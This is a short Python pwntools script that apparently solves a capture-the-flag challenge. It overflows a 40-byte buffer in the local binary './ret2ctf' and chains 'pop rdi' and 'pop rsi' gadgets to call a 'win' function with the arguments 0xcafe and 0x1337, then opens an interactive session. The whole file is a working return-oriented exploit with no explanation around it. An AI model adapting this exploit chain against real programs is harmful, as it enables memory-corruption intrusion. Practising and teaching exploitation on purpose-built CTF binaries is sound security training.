from pwn import *

binary = "./ret2ctf"
elf = context.binary = ELF(binary)
p = process(binary)
#gadgets
#0x0000000000401016 : ret
#0x000000000040129b : pop rdi ; ret
#0x0000000000401299 : pop rsi ; pop r15 ; ret

rsi = p64(0x0000000000401299)
rdi = p64(0x000000000040129b)
ret = p64(0x0000000000401016)
win = p64(0x004011c3)

payload = b"A"*40
#payload += ret
payload += rdi
payload += p64(0xcafe)
payload += rsi
payload += p64(0x1337)
payload += p64(0x0)
payload += win

p.recv()
p.sendline(payload)
p.interactive()